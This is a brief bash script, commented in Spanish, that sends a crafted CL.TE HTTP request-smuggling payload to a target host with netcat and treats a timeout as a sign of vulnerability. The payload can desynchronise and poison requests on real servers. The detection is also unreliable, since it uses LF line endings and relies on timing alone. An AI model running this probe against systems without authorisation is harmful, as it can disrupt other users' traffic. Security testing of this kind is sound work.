#!/bin/bash

# Script mejorado con netcat para HTTP Smuggling detection
# Requiere: netcat tradicional (nc)


HOST=$1
PORT=${2:-80}
TIMEOUT=5

echo "Testing HTTP Smuggling on: $HOST:$PORT"
echo ""

cat > /tmp/smuggle_request.txt << EOF
POST / HTTP/1.1
Host: $HOST
Content-Length: 6
Transfer-Encoding: chunked
Connection: keep-alive

0

G
EOF

START_TIME=$(date +%s)
nc -w $TIMEOUT $HOST $PORT < /tmp/smuggle_request.txt > /tmp/response.txt 2>&1
END_TIME=$(date +%s)

ELAPSED=$((END_TIME - START_TIME))

if [ $ELAPSED -ge $TIMEOUT ]; then
    echo "[!] HIGH LIKELIHOOD OF VULNERABILITY"
    echo "    Response timed out after ${ELAPSED}s"
    echo "    Potential CL.TE Smuggling"
    echo ""
    echo "Response preview:"
    head -c 200 /tmp/response.txt 2>/dev/null || echo "No response received"
else
    echo "[ ] No immediate vulnerability detected"
    echo "    Response time: ${ELAPSED}s"
    echo ""
    echo "Full response:"
    cat /tmp/response.txt
fi

# Limpieza
rm -f /tmp/smuggle_request.txt /tmp/response.txt
